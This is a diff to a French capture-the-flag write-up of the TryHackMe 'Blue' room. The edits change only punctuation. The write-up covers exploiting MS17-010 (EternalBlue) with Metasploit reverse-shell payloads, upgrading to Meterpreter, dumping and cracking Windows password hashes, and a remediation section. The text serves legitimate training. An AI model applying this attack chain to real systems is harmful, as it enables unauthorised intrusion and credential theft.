@@ -1,15 +1,14 @@
-# TryHackMe — Blue (EternalBlue / MS17-010)
+# TryHackMe | Blue (EternalBlue / MS17-010)
 
 | | |
 |---|---|
 | **Room** | [Blue](https://tryhackme.com/room/blue) |
 | **Plateforme** | TryHackMe |
-| **Niveau** | Débutant |
 | **Catégorie** | Exploitation Windows / SMB |
 | **CVE** | CVE-2017-0143 à CVE-2017-0148 (MS17-010 / EternalBlue) |
 | **Cible** | Windows Server 2012 R2 Datacenter (environnement de lab isolé et jetable fourni par TryHackMe) |
 | **Outils** | Nmap, Metasploit Framework, John the Ripper |
-| **Statut** | Terminé — 3 flags capturés |
+| **Statut** | Terminé | 3 flags capturés |
 
 >  **Cadre d'exercice.** Cette machine est une cible volontairement vulnérable, provisionnée par TryHackMe pour l'apprentissage, accessible uniquement via le VPN du lab et détruite à la fin de la session. Les adresses IP, hash et mots de passe ci-dessous n'ont de valeur que dans ce contexte pédagogique précis et ne doivent jamais être réutilisés tels quels sur un test réel sans autorisation écrite (scope / rules of engagement).
 
@@ -17,8 +16,8 @@
 
 1. [Reconnaissance](#1-reconnaissance)
 2. [Identification de la vulnérabilité](#2-identification-de-la-vulnérabilité)
-3. [Exploitation — EternalBlue](#3-exploitation--eternalblue)
-4. [Post-exploitation — Meterpreter](#4-post-exploitation--meterpreter)
+3. [Exploitation EternalBlue](#3-exploitation--eternalblue)
+4. [Post-exploitation Meterpreter](#4-post-exploitation--meterpreter)
 5. [Élévation de privilèges et dump des hashs](#5-élévation-de-privilèges-et-dump-des-hashs)
 6. [Cassage des mots de passe](#6-cassage-des-mots-de-passe)
 7. [Capture des flags](#7-capture-des-flags)
@@ -61,9 +60,9 @@ nmap --script vuln 10.128.175.89
 - `smb-vuln-ms17-010` : **VULNERABLE**, risque **HIGH**, CVE-2017-0143.
 - Référence officielle Microsoft et CVE citées directement dans la sortie du script.
 
-> **À retenir :** ne jamais sauter l'étape de vérification avant exploitation. `smb-vuln-ms17-010` (ou le module auxiliaire `auxiliary/scanner/smb/smb_ms17_010`) permet de confirmer la faille *sans* envoyer de payload destructeur — utile en contexte réel pour ne pas faire crasher un service en production avant d'avoir l'autorisation d'exploiter.
+> **À retenir :** ne jamais sauter l'étape de vérification avant exploitation. `smb-vuln-ms17-010` (ou le module auxiliaire `auxiliary/scanner/smb/smb_ms17_010`) permet de confirmer la faille *sans* envoyer de payload destructeur, utile en contexte réel pour ne pas faire crasher un service en production avant d'avoir l'autorisation d'exploiter.
 
-## 3. Exploitation — EternalBlue
+## 3. Exploitation | EternalBlue
 
 ### 3.1 Sélection du module
 
@@ -92,7 +91,7 @@ show payloads
 
 ![Liste des payloads compatibles](assets/05-msf-show-payloads.png)
 
-Deux familles de payload possibles : `windows/x64/meterpreter/reverse_tcp` (agent complet) ou `windows/x64/shell/reverse_tcp` (shell de commande basique). Sur cette cible, le payload **shell** s'est montré plus stable à la première tentative — le payload meterpreter direct a échoué plusieurs fois avec un timeout du stager (`Exploit failed... Read timeout expired`), un comportement connu : EternalBlue corrompt partiellement le pool mémoire non paginé du noyau, ce qui peut rendre les tentatives suivantes instables tant que la machine n'est pas redémarrée.
+Deux familles de payload possibles : `windows/x64/meterpreter/reverse_tcp` (agent complet) ou `windows/x64/shell/reverse_tcp` (shell de commande basique). Sur cette cible, le payload **shell** s'est montré plus stable à la première tentative, le payload meterpreter direct a échoué plusieurs fois avec un timeout du stager (`Exploit failed... Read timeout expired`), un comportement connu : EternalBlue corrompt partiellement le pool mémoire non paginé du noyau, ce qui peut rendre les tentatives suivantes instables tant que la machine n'est pas redémarrée.
 
 **Point de configuration critique :** `LHOST` doit être l'adresse de l'interface **VPN** (`tun0`, ici `192.168.134.110`), pas l'IP NAT de la VM d'attaque (`10.0.2.15`). Une erreur fréquente des débutants est de laisser l'IP par défaut de VirtualBox, ce qui rend le reverse shell injoignable depuis la cible.
 
@@ -106,11 +105,11 @@ exploit
 
 ![Exploit réussi, shell ouvert](assets/06-msf-exploit-shell-opened.png)
 
-**Résultat :** `Command shell session 1 opened` — un shell `cmd.exe` Windows est obtenu, confirmé par la bannière `Microsoft Windows [Version 6.3.9600]` et l'invite `C:\Windows\system32>`.
+**Résultat :** `Command shell session 1 opened` , un shell `cmd.exe` Windows est obtenu, confirmé par la bannière `Microsoft Windows [Version 6.3.9600]` et l'invite `C:\Windows\system32>`.
 
-> **À retenir :** un échec d'exploit n'est pas toujours un échec de méthode — ici la cause était l'instabilité de la cible après plusieurs tentatives, pas une erreur de configuration. Redémarrer la cible et re-tester avec un payload plus simple a suffi à débloquer la situation.
+> **À retenir :** un échec d'exploit n'est pas toujours un échec de méthode, ici la cause était l'instabilité de la cible après plusieurs tentatives, pas une erreur de configuration. Redémarrer la cible et re-tester avec un payload plus simple a suffi à débloquer la situation.
 
-## 4. Post-exploitation — Meterpreter
+## 4. Post-exploitation | Meterpreter
 
 Le shell `cmd.exe` obtenu est volontairement basique. Pour la suite (élévation, migration de processus, dump de hash), on bascule vers un agent Meterpreter plus riche, sans perdre l'accès déjà obtenu.
 
@@ -135,7 +134,7 @@ run
 
 **Résultat :** `Meterpreter session 2 opened`.
 
-> **À retenir :** un premier échec du module (`Post module execution completed` sans session ouverte) est courant sur un shell `cmd` basique — relancer le module avec `SESSION` et `LHOST` correctement définis suffit en général. Dans le pire des cas, le shell `cmd` initial reste pleinement utilisable pour naviguer et lire des fichiers via `shell`/`dir`/`type`, sans attendre Meterpreter.
+> **À retenir :** un premier échec du module (`Post module execution completed` sans session ouverte) est courant sur un shell `cmd` basique, relancer le module avec `SESSION` et `LHOST` correctement définis suffit en général. Dans le pire des cas, le shell `cmd` initial reste pleinement utilisable pour naviguer et lire des fichiers via `shell`/`dir`/`type`, sans attendre Meterpreter.
 
 ## 5. Élévation de privilèges et dump des hashs
 
@@ -147,7 +146,7 @@ getuid
 
 ![getsystem / getuid](assets/11-meterpreter-getsystem-getuid.png)
 
-**Résultat :** `Server username: NT AUTHORITY\SYSTEM` — le payload EternalBlue s'exécute déjà en contexte SYSTEM (comportement typique de cette CVE, qui exploite directement le noyau), donc `getsystem` confirme simplement l'état existant.
+**Résultat :** `Server username: NT AUTHORITY\SYSTEM`, le payload EternalBlue s'exécute déjà en contexte SYSTEM (comportement typique de cette CVE, qui exploite directement le noyau), donc `getsystem` confirme simplement l'état existant.
 
 Avant de dumper les hashs, on migre vers un processus plus stable que le thread injecté initial (souvent rattaché à un processus temporaire qui peut mourir) :
 
@@ -191,15 +190,15 @@ john --show --format=NT hash.txt
 
 ![Résultat John the Ripper](assets/16-john-crack-hashes.png)
 
-**Résultat :** les deux mots de passe ont été cassés en **moins d'une seconde** avec `rockyou.txt` (8–14k mots de passe/sec testés). Les deux valeurs trouvées sont de simples variations de mots du dictionnaire avec majuscule et chiffres — un schéma extrêmement répandu et totalement inefficace contre une attaque par dictionnaire.
+**Résultat :** les deux mots de passe ont été cassés en **moins d'une seconde** avec `rockyou.txt` (8–14k mots de passe/sec testés). Les deux valeurs trouvées sont de simples variations de mots du dictionnaire avec majuscule et chiffres, un schéma extrêmement répandu et totalement inefficace contre une attaque par dictionnaire.
 
 > **À retenir :** c'est la démonstration la plus parlante de toute la room. La compromission initiale exploite une faille logicielle non patchée (MS17-010), mais la compromission des comptes utilisateurs exploite une faille humaine (mot de passe faible). Un patch corrige le premier problème ; seule une politique de mots de passe stricte (longueur, MFA, blocage des mots de passe compromis) corrige le second.
 
 ## 7. Capture des flags
 
-Trois flags à récupérer via Meterpreter (`cd`, `ls`, `cat` — pas les commandes Windows classiques tant qu'on est dans le contexte Meterpreter) :
+Trois flags à récupérer via Meterpreter (`cd`, `ls`, `cat` , pas les commandes Windows classiques tant qu'on est dans le contexte Meterpreter) :
 
-**Flag 1 — racine de `C:\`**
+**Flag 1 : racine de `C:\`**
 ```bash
 cd C:\\
 ls
@@ -208,7 +207,7 @@ cat flag1.txt
 ![Flag 1](assets/17-flag1-root-c.png)
 → `flag{access_the_machine}`
 
-**Flag 2 — `C:\Windows\System32\config`**
+**Flag 2 : `C:\Windows\System32\config`**
 ```bash
 cd C:\\Windows\\System32\\config
 ls
@@ -220,7 +219,7 @@ cat flag2.txt
 ![Flag 2](assets/19-flag2-content.png)
 → `flag{sam_database_elevated_access}`
 
-**Flag 3 — `C:\Users\Jon\Documents`**
+**Flag 3 : `C:\Users\Jon\Documents`**
 ```bash
 cd C:\\Users\\Jon\\Documents
 ls
@@ -229,7 +228,7 @@ cat flag3.txt
 ![Flag 3](assets/20-flag3-jon-documents.png)
 → `flag{admin_documents_can_be_valuable}`
 
-> **À retenir :** l'emplacement des flags n'est pas anodin — `System32\config` est le dossier qui héberge la base SAM (comptes et hashs locaux), et le dossier `Documents` d'un utilisateur est un classique pour y trouver des informations sensibles oubliées (identifiants, notes). La room fait délibérément le lien entre "où chercher" et "pourquoi ces emplacements sont sensibles".
+> **À retenir :** l'emplacement des flags n'est pas anodin , `System32\config` est le dossier qui héberge la base SAM (comptes et hashs locaux), et le dossier `Documents` d'un utilisateur est un classique pour y trouver des informations sensibles oubliées (identifiants, notes). La room fait délibérément le lien entre "où chercher" et "pourquoi ces emplacements sont sensibles".
 
 ---
 
@@ -249,12 +248,12 @@ cat flag3.txt
 Toute la chaîne d'attaque ci-dessus repose sur des faiblesses **connues depuis 2017 et faciles à corriger**. Voici les mesures qui, en environnement réel, auraient bloqué chaque étape :
 
 ### Contre l'exploitation initiale (MS17-010 / EternalBlue)
-- **Appliquer le patch MS17-010** (mars 2017) sur tout système Windows — y compris les versions en fin de support (Microsoft a exceptionnellement publié un correctif pour Windows XP/2003 après WannaCry).
+- **Appliquer le patch MS17-010** (mars 2017) sur tout système Windows, y compris les versions en fin de support (Microsoft a exceptionnellement publié un correctif pour Windows XP/2003 après WannaCry).
 - **Désactiver SMBv1** quand il n'est pas strictement nécessaire :
   ```powershell
   Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
   ```
-- **Exiger** la signature SMB (`Require SMB Signing`), pas seulement l'autoriser — observé ici comme "enabled but not required", c'est une faiblesse en soi indépendamment de MS17-010.
+- **Exiger** la signature SMB (`Require SMB Signing`), pas seulement l'autoriser, observé ici comme "enabled but not required", c'est une faiblesse en soi indépendamment de MS17-010.
 - **Segmenter le réseau** : un hôte SMB exposé ne devrait jamais être accessible directement depuis un réseau non fiable ; filtrer 445/139/3389 en périmètre et entre VLANs.
 - **Détection** : les tentatives EternalBlue laissent des signatures réseau reconnaissables (paquets SMB malformés, transactions NT Trans anormales) détectables par une sonde IDS/IPS (Suricata/Snort disposent de règles dédiées) ou un EDR surveillant les crashs/anomalies de `lsass.exe`/`srv.sys`.
 
@@ -270,13 +269,13 @@ Toute la chaîne d'attaque ci-dessus repose sur des faiblesses **connues depuis 
 - Désactiver ou renommer les comptes locaux à privilèges inutiles, limiter l'authentification NTLM au profit de Kerberos quand c'est possible.
 
 ### Côté hygiène générale observée pendant ce lab
-- Toujours faire tourner son instance d'attaque sur l'interface VPN dédiée (`tun0`), jamais l'IP NAT — cela vaut aussi en défense : s'assurer qu'aucun service interne n'écoute par erreur sur une interface exposée.
+- Toujours faire tourner son instance d'attaque sur l'interface VPN dédiée (`tun0`), jamais l'IP NAT, cela vaut aussi en défense : s'assurer qu'aucun service interne n'écoute par erreur sur une interface exposée.
 - Avant de partager des logs ou captures d'écran (write-up, rapport de pentest), **assainir** les identifiants, hashs et adresses IP réelles si le contexte n'est pas un lab jetable.
 
 ## 10. Références
 
-- [TryHackMe — Room Blue](https://tryhackme.com/room/blue)
-- [Microsoft MS17-010 Security Bulletin](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
-- [CVE-2017-0143 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
-- [Rapid7 — MS17-010 EternalBlue module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
-- [Microsoft — Customer Guidance for WannaCrypt Attacks](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
+- [TryHackMe, Room Blue](https://tryhackme.com/room/blue)
+- [Microsoft, MS17-010 Security Bulletin](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
+- [CVE-2017-0143,  MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
+- [Rapid7, MS17-010 EternalBlue module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
+- [Microsoft, Customer Guidance for WannaCrypt Attacks](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
